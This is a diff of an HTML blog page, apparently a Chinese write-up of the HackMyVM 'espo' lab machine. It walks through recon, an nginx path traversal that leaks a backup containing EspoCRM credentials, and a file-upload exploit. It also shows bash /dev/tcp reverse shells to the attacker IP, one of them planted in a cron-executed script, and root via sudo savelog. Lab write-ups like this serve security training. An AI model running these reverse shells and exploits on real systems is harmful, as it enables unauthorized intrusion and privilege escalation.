@@ -180,14 +180,14 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hmv_espo</h1>
 <h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=espo" rel="nofollow">hackmyvm - espo</a><br>
-<strong>难度</strong>：黄色<br>
-<strong>目标 IP</strong>：192.168.205.236<br>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=espo">hackmyvm - espo</a>
+<strong>难度</strong>：黄色
+<strong>目标 IP</strong>：192.168.205.236
 <strong>本机 IP</strong>：192.168.205.141</p>
-<hr>
+<hr />
 <h1>1.扫描</h1>
-<p><code class="notranslate">nmap</code>起手</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p><code>nmap</code>起手</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
 Nmap scan report for 192.168.205.236
@@ -200,11 +200,11 @@ MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
 </code></pre>
-<hr>
+<hr />
 <h1>2.踩点</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3"><img src="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3" alt="image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3" alt="image" /></p>
 <p>是个登录栏，搜索一下有没有什么漏洞</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ whatweb http://192.168.205.236                                     
 http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                     
@@ -219,7 +219,7 @@ Shellcodes: No Results
                                  
 </code></pre>
 <p>只有权限提升漏洞，但是我们没有用户。爆破一下目录</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
 ===============================================================
 Gobuster v3.6
@@ -252,11 +252,11 @@ Finished
                                  
 </code></pre>
 <p>发现一点有意思的东西</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51"><img src="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51" alt="image" style="max-width: 100%;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51"><img src="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51" alt="image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51" alt="image" /></p>
+<p><img src="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51" alt="image" /></p>
 <p>貌似可以通过绕过读取文件夹外的文件，我们爆破试试</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u "http://192.168.205.236/admin../FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u &quot;http://192.168.205.236/admin../FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -269,11 +269,11 @@ Total requests: 62284
 ID           Response   Lines    Word       Chars       Payload                                                             
 =====================================================================
 
-000000003:   301        7 L      11 W       162 Ch      "admin"                                                             
-000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
-000008002:   301        7 L      11 W       162 Ch      "_oldsite"                                                          
-000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
-000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   
+000000003:   301        7 L      11 W       162 Ch      &quot;admin&quot;                                                             
+000004255:   403        7 L      9 W        146 Ch      &quot;http://192.168.205.236/admin../&quot;                                   
+000008002:   301        7 L      11 W       162 Ch      &quot;_oldsite&quot;                                                          
+000030014:   403        7 L      9 W        146 Ch      &quot;http://192.168.205.236/admin../&quot;                                   
+000059104:   403        7 L      9 W        146 Ch      &quot;http://192.168.205.236/admin../&quot;                                   
 
 Total time: 0
 Processed Requests: 62284
@@ -283,8 +283,8 @@ Requests/sec.: 0
               
 </code></pre>
 <p>确实可以，我们继续爆破</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ wfuzz -u "http://192.168.205.236/admin../_oldsite/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u &quot;http://192.168.205.236/admin../_oldsite/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -297,10 +297,10 @@ Total requests: 62284
 ID           Response   Lines    Word       Chars       Payload                                                             
 =====================================================================
 
-000000167:   200        11 L     79 W       540 Ch      "info"                                                              
-000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
-000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
-000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          
+000000167:   200        11 L     79 W       540 Ch      &quot;info&quot;                                                              
+000004255:   403        7 L      9 W        146 Ch      &quot;http://192.168.205.236/admin../_oldsite/&quot;                          
+000030014:   403        7 L      9 W        146 Ch      &quot;http://192.168.205.236/admin../_oldsite/&quot;                          
+000059104:   403        7 L      9 W        146 Ch      &quot;http://192.168.205.236/admin../_oldsite/&quot;                          
 
 Total time: 34.86630
 Processed Requests: 62284
@@ -310,7 +310,7 @@ Requests/sec.: 1786.366
                                            
 </code></pre>
 <p>有个文件，我们查看一下</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.236/admin../_oldsite/info
 # Backup Configuration Settings
 # This configuration file dictates the backup protocols for critical data storage.
@@ -336,8 +336,8 @@ backup_format:zip
 #需要定期维护和检查，确保数据的一致性和可靠性。
 </code></pre>
 <p>告诉了我们会保存备注文件，并且备份文件会以.zip为后缀，我们根据信息爆破一下</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
-└─$ wfuzz -u "http://192.168.205.236/admin../_oldsite/FUZZ.zip" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test/tmp]
+└─$ wfuzz -u &quot;http://192.168.205.236/admin../_oldsite/FUZZ.zip&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -350,7 +350,7 @@ Total requests: 62284
 ID           Response   Lines    Word       Chars       Payload                                                             
 =====================================================================
 
-000000066:   200        139379   1377104    36126245    "backup"                                                            
+000000066:   200        139379   1377104    36126245    &quot;backup&quot;                                                            
                          L       W          Ch                                                                              
 
 Total time: 36.69276
@@ -361,7 +361,7 @@ Requests/sec.: 1697.446
                              
 </code></pre>
 <p>我们把备份文件下载下来</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test/tmp]
 └─$ wget http://192.168.205.236/admin../_oldsite/backup.zip
 --2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip
 正在连接 192.168.205.236:80... 已连接。
@@ -624,10 +624,10 @@ return [
                                                     
 </code></pre>
 <p>在data文件夹中发现了配置文件，并且配置文件中有账号和密码，我们尝试登录</p>
-<p>成功进入<code class="notranslate">EspoCRM</code>,查看一下他版本信息</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22"><img src="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22" alt="image" style="max-width: 100%;"></a></p>
+<p>成功进入<code>EspoCRM</code>,查看一下他版本信息</p>
+<p><img src="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22" alt="image" /></p>
 <p>搜索该版本有没有漏洞。通过搜索发现存在<a href="https://github.com/josemlwdf/CVE-2023-5965">上传文件漏洞</a>，我们利用一下</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
 正克隆到 'CVE-2023-5965'...
 remote: Enumerating objects: 37, done.
@@ -639,11 +639,11 @@ remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
                                              
 </code></pre>
 <p>发现第一个通过更新无效，尝试第二个上传插件，成功上传并有反馈</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201"><img src="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201" alt="image" style="max-width: 100%;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1"><img src="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1" alt="image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201" alt="image" /></p>
+<p><img src="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1" alt="image" /></p>
 <p>弹一个反弹shell回来</p>
-<pre lang="bash" class="notranslate"><code class="notranslate"># 执行语句
-bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"
+<pre lang="bash"><code># 执行语句
+bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1&quot;
 
 ┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888                        
@@ -655,10 +655,10 @@ www-data@espo:~/html/public$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
-<hr>
+<hr />
 <h1>3. 获得稳定的 Shell</h1>
 <p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
+<pre lang="bash"><code>script /dev/null -c bash  
 ctrl+z  
 stty raw -echo; fg  
 reset xterm  
@@ -667,9 +667,9 @@ echo $SHELL
 export SHELL=/bin/bash  
 stty rows 59 cols 236
 </code></pre>
-<hr>
+<hr />
 <h1>4.提权</h1>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@espo:~/html/public$ ls -la
+<pre lang="bash"><code>www-data@espo:~/html/public$ ls -la
 total 36
 drwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 .
 drwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..
@@ -736,19 +736,19 @@ bash: cd: copyPics: Not a directory
 www-data@espo:/home/mandie$ cat copyPics 
 #!/bin/bash
 
-SOURCE_MEDIAS="/var/shared_medias"
-PICTURES_DIR="$HOME/pictures"
-VIDEOS_DIR="$HOME/videos"
+SOURCE_MEDIAS=&quot;/var/shared_medias&quot;
+PICTURES_DIR=&quot;$HOME/pictures&quot;
+VIDEOS_DIR=&quot;$HOME/videos&quot;
 
-/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2&gt;/dev/null \;
-mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"
+/usr/bin/find &quot;$SOURCE_MEDIAS&quot; ! -executable -exec /usr/bin/cp {} &quot;$HOME&quot; 2&gt;/dev/null \;
+mkdir -p &quot;$PICTURES_DIR&quot; &quot;$VIDEOS_DIR&quot;
 
 declare -A directory_mappings
-directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )
+directory_mappings=( [&quot;$PICTURES_DIR&quot;]=&quot;jpeg jpg&quot; [&quot;$VIDEOS_DIR&quot;]=&quot;mp4 avi&quot; )
 
-for dir in "${!directory_mappings[@]}"; do
+for dir in &quot;${!directory_mappings[@]}&quot;; do
     for ext in ${directory_mappings[$dir]}; do
-        mv "$HOME"/*.$ext "$dir/" 2&gt;/dev/null
+        mv &quot;$HOME&quot;/*.$ext &quot;$dir/&quot; 2&gt;/dev/null
     done
 done
 www-data@espo:/home/mandie$ cd /tmp/
@@ -792,7 +792,7 @@ done
 2025/01/08 06:57:08 CMD: UID=0     PID=2011   | 
 2025/01/08 06:57:08 CMD: UID=33    PID=1990   | bash -i 
 2025/01/08 06:57:08 CMD: UID=33    PID=1989   | bash -c bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1 
-2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1" 
+2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1&quot; 
 2025/01/08 06:57:08 CMD: UID=0     PID=1935   | 
 2025/01/08 06:57:08 CMD: UID=0     PID=1873   | 
 2025/01/08 06:57:08 CMD: UID=0     PID=1808   | 
@@ -892,28 +892,28 @@ done
 ^CExiting program... (interrupt)
 
 </code></pre>
-<p>有定时任务用<code class="notranslate">UID1000</code>的用户执行<code class="notranslate">/home/mandie/copyPics</code>，<code class="notranslate">copyPics</code>的内容</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@espo:/home/mandie$ cat copyPics 
+<p>有定时任务用<code>UID1000</code>的用户执行<code>/home/mandie/copyPics</code>，<code>copyPics</code>的内容</p>
+<pre lang="bash"><code>www-data@espo:/home/mandie$ cat copyPics 
 #!/bin/bash
 
-SOURCE_MEDIAS="/var/shared_medias"
-PICTURES_DIR="$HOME/pictures"
-VIDEOS_DIR="$HOME/videos"
+SOURCE_MEDIAS=&quot;/var/shared_medias&quot;
+PICTURES_DIR=&quot;$HOME/pictures&quot;
+VIDEOS_DIR=&quot;$HOME/videos&quot;
 
-/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2&gt;/dev/null \;
-mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"
+/usr/bin/find &quot;$SOURCE_MEDIAS&quot; ! -executable -exec /usr/bin/cp {} &quot;$HOME&quot; 2&gt;/dev/null \;
+mkdir -p &quot;$PICTURES_DIR&quot; &quot;$VIDEOS_DIR&quot;
 
 declare -A directory_mappings
-directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )
+directory_mappings=( [&quot;$PICTURES_DIR&quot;]=&quot;jpeg jpg&quot; [&quot;$VIDEOS_DIR&quot;]=&quot;mp4 avi&quot; )
 
-for dir in "${!directory_mappings[@]}"; do
+for dir in &quot;${!directory_mappings[@]}&quot;; do
     for ext in ${directory_mappings[$dir]}; do
-        mv "$HOME"/*.$ext "$dir/" 2&gt;/dev/null
+        mv &quot;$HOME&quot;/*.$ext &quot;$dir/&quot; 2&gt;/dev/null
     done
 done
 </code></pre>
-<p>实现了从一个目录 <code class="notranslate">/var/shared_medias</code> 中筛选不可执行文件，并把文件复制到用户的家目录下。那我们可以尝试在<code class="notranslate">/var/shared_medias</code>中创建一个<code class="notranslate">copyPics</code>文件，并在里面加点料</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@espo:/tmp$ ls -la /var/shared_medias
+<p>实现了从一个目录 <code>/var/shared_medias</code> 中筛选不可执行文件，并把文件复制到用户的家目录下。那我们可以尝试在<code>/var/shared_medias</code>中创建一个<code>copyPics</code>文件，并在里面加点料</p>
+<pre lang="bash"><code>www-data@espo:/tmp$ ls -la /var/shared_medias
 total 7792
 drwxrwxrwt  2 root root    4096 Jan 24  2024 .
 drwxr-xr-x 13 root root    4096 Dec  7  2023 ..
@@ -930,27 +930,27 @@ www-data@espo:/var/shared_medias$ nano copyPics
 www-data@espo:/var/shared_medias$ cat copyPics 
 #!/bin/bash
 
-SOURCE_MEDIAS="/var/shared_medias"
-PICTURES_DIR="$HOME/pictures"
-VIDEOS_DIR="$HOME/videos"
+SOURCE_MEDIAS=&quot;/var/shared_medias&quot;
+PICTURES_DIR=&quot;$HOME/pictures&quot;
+VIDEOS_DIR=&quot;$HOME/videos&quot;
 
-/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2&gt;/dev/null \;
-mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"
+/usr/bin/find &quot;$SOURCE_MEDIAS&quot; ! -executable -exec /usr/bin/cp {} &quot;$HOME&quot; 2&gt;/dev/null \;
+mkdir -p &quot;$PICTURES_DIR&quot; &quot;$VIDEOS_DIR&quot;
 
 declare -A directory_mappings
-directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )
+directory_mappings=( [&quot;$PICTURES_DIR&quot;]=&quot;jpeg jpg&quot; [&quot;$VIDEOS_DIR&quot;]=&quot;mp4 avi&quot; )
 
-for dir in "${!directory_mappings[@]}"; do
+for dir in &quot;${!directory_mappings[@]}&quot;; do
     for ext in ${directory_mappings[$dir]}; do
-        mv "$HOME"/*.$ext "$dir/" 2&gt;/dev/null
+        mv &quot;$HOME&quot;/*.$ext &quot;$dir/&quot; 2&gt;/dev/null
     done
 done
 
 
-bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/9999 0&gt;&amp;1"
+bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.141/9999 0&gt;&amp;1&quot;
 </code></pre>
 <p>让子弹飞会</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 9999
 listening on [any] 9999 ...
 id
@@ -962,7 +962,7 @@ uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)
 
 </code></pre>
 <p>获得一下稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
+<pre lang="bash"><code>script /dev/null -c bash  
 ctrl+z  
 stty raw -echo; fg  
 reset xterm  
@@ -972,7 +972,7 @@ export SHELL=/bin/bash
 stty rows 59 cols 236
 </code></pre>
 <p>尝试提权</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">mandie@espo:~$ sudo -l
+<pre lang="bash"><code>mandie@espo:~$ sudo -l
 sudo: unable to resolve host espo: Name or service not known
 Matching Defaults entries for mandie on espo:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -1024,8 +1024,8 @@ Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
         file - 日志文件名
 
 </code></pre>
-<p><code class="notranslate">-x</code>我们比较感兴趣，试试行不行</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">mandie@espo:~$ find / -name "*.log" 2&gt;/dev/null
+<p><code>-x</code>我们比较感兴趣，试试行不行</p>
+<pre lang="bash"><code>mandie@espo:~$ find / -name &quot;*.log&quot; 2&gt;/dev/null
 /var/www/html/data/logs/espo-2023-12-04.log
 /var/www/html/data/logs/espo-2025-01-08.log
 /var/www/html/data/logs/espo-2024-01-24.log
@@ -1043,10 +1043,11 @@ uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 <p>成功提权</p>
 <h1>5.后话</h1>
-<p>看了一下<code class="notranslate">HGBE</code>大佬的wp，才发现群主<code class="notranslate">ll104567</code>发现了一个定时任务直接获取 root</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d"><img src="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d" alt="image" style="max-width: 100%;"></a></p>
-<p>甚至在<code class="notranslate">www-data</code>权限的时候就可以直接提权到<code class="notranslate">root</code><br>
-<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95"><img src="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95" alt="C4" style="max-width: 100%;"></a></p></div>
+<p>看了一下<code>HGBE</code>大佬的wp，才发现群主<code>ll104567</code>发现了一个定时任务直接获取 root</p>
+<p><img src="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d" alt="image" /></p>
+<p>甚至在<code>www-data</code>权限的时候就可以直接提权到<code>root</code>
+<img src="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95" alt="C4" /></p>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
